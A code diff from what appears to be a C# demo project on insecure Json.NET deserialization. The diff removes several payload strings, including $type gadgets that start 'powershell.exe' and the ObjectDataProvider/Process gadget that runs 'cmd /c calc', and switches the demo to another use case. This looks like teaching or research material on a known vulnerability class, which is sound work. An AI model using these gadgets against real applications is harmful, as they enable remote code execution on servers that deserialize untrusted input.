@@ -24,36 +24,8 @@ namespace mvcapp.Controllers
             //UseCaseThree.Run();
             //UseCaseFour.Run();
             //UseCaseFive.Run();
-            UseCaseSix.Run();
-
-
-            //var complex = new ComplexConstructor("powershell.exe")
-            //{
-            //    ID = 3,
-            //};
-
-            //var serializedComplex = JsonConvert.SerializeObject(complex, new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All });
-
-            //{"$type":"mvcapp.Models.Simple, mvcapp","ID":1,"Value":"Some test string."}
-            //{"$type":"mvcapp.Models.Simple, mvcapp","ID":1,"Value":{"$type":"mvcapp.Models.Simple, mvcapp","ID":2,"Value":"Some test string 2."}}
-            //{"$type":"mvcapp.Models.ComplexConstructor, mvcapp","ID":3,"Parameters":"powershell.exe"}
-
-            string payloadWithComplexConstructor = "{\"$type\":\"mvcapp.Models.Simple, mvcapp\",\"ID\":1,\"Value\":{\"$type\":\"mvcapp.Models.ComplexConstructor, mvcapp\",\"ID\":2,\"Parameters\":\"powershell.exe\"}}";
-            string payloadWithComplexSetter = "{\"$type\":\"mvcapp.Models.Simple, mvcapp\",\"ID\":1,\"Value\":{\"$type\":\"mvcapp.Models.ComplexSetter, mvcapp\",\"ID\":2,\"Parameters\":\"powershell.exe\"}}";
-
-            string objectDataProviderPayload = @"{
-                '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
-                'MethodName':'Start',
-                'MethodParameters':{
-                    '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
-                    '$values':['cmd','/ccalc']
-                },
-                'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
-            }";
-
-            string payloadWithObjectDataProviderPayload ="{\"$type\":\"mvcapp.Models.Simple, mvcapp\",\"ID\":1,\"Value\":"+ objectDataProviderPayload +"}";
-
-
+            //UseCaseSix.Run();
+            UseCaseSeven.Run();
 
             return View();
         }
